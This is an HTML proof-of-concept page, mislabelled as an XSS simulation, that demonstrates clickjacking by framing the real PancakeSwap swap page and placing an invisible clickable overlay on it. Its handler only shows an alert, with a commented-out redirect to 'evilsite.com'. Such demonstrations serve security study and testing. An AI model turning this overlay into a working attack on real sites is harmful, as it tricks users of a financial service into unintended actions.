<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced XSS Simulation</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f0f0f0;
            position: relative;
        }
        .iframe-container {
            position: relative;
            width: 100%;
            height: 100%;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            opacity: 1; /* Fully visible */
        }
        /* Specific clickable area - this is now invisible but still clickable */
        .click-area {
            position: absolute;
            top: 30%;
            left: 30%;
            width: 150px;
            height: 50px;
            background-color: rgba(255, 0, 0, 0.3); /* Light red background */
            color: white;
            text-align: center;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
            z-index: 3;
            opacity: 0; /* Still invisible but clickable */
        }
        .click-area:hover {
            background-color: rgba(255, 0, 0, 0.5); /* Slightly more visible on hover */
        }
    </style>
</head>
<body>
    <div class="iframe-container">
        <!-- Iframe containing PancakeSwap -->
        <iframe src="https://pancakeswap.finance/swap" frameborder="0"></iframe>

        <!-- Invisible clickable area (red) -->
        <div class="click-area" onclick="triggerAction()">
            <!-- No visible text here as the area is invisible -->
        </div>
    </div>

    <script>
        // This function triggers a specific action based on the clicked area
        function triggerAction() {
            alert('You clicked in the specified area! This could be part of a clickjacking attack.');
            // Example action: you can also add a redirect or other actions here
            // window.location.href = 'https://evilsite.com';
        }
    </script>
</body>
</html>
